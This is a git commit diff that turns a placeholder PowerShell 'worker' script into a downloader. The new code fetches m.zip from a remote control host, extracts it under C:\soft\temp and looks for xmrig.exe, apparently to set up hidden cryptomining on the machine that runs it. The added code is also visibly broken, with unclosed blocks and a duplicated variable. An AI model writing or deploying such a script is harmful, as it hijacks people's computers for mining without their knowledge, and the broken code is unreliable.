47d5341975988c082ff205cd92873a432794e740
Roy <157291828+Rigriz@users.noreply.github.com>
2026-02-28 07:09:03 -0800

    Update worker.ps1

--- public/worker.ps1
+++ public/worker.ps1
@@ -1,14 +1,50 @@
-# ===================================
-# WORKER SCRIPT
-# Runs temporary workload
-# ===================================
+$SERVER = "https://mcontrol.vercel.app/"
+$SYSTEM = $env:COMPUTERNAME
 
-Write-Host "Worker started"
+$TEMP_DIR = "$env:TEMP\worker_env"
+$WORKER = $false
+$CPU_LIMIT = 70
 
-while ($true) {
+$BASE_DIR = "C:\soft"
+$TEMP_DIR = "C:\soft\temp"
+$M =   "C:\soft\temp\m"
+$MINER_EXE = "$TEMP_DIR\m\xmrig-6.25.0\xmrig.exe"
+function Mit([string]$command) {
 
-    # Your workload here
-    Write-Host "Worker running..."
+    if ($command -eq "start") {
 
-    Start-Sleep -Seconds 10
+        # Ensure base directory exists
+        if (!(Test-Path $BASE_DIR)) {
+            New-Item -ItemType Directory -Path $BASE_DIR | Out-Null
+        }
+
+        # Ensure temp directory exists
+        if (!(Test-Path $TEMP_DIR)) {
+            New-Item -ItemType Directory -Path $TEMP_DIR | Out-Null
+        }
+        New-Item -ItemType Directory -Path $M | Out-Null
+          Write-Host "m folder created"
+          $zipFile = "$TEMP_DIR\m.zip"
+          $minerZipUrl = "https://mcontrol.vercel.app/m.zip"
+
+        Write-Host "Downloading mining package..."
+
+        Invoke-WebRequest `
+            -Uri $minerZipUrl `
+            -OutFile $zipFile `
+            -UseBasicParsing
+
+        Write-Host "Extracting mining package..."
+
+        Expand-Archive `
+            -Path $zipFile `
+            -DestinationPath $M `
+            -Force
+         Write-Host "unzipped"
+        Remove-Item $zipFile -Force
+        if (!(Test-Path $MINER_EXE)) {
+            Write-Host "xmrig.exe not found!"
+            return
+        } 
 }
+Mit "stop"
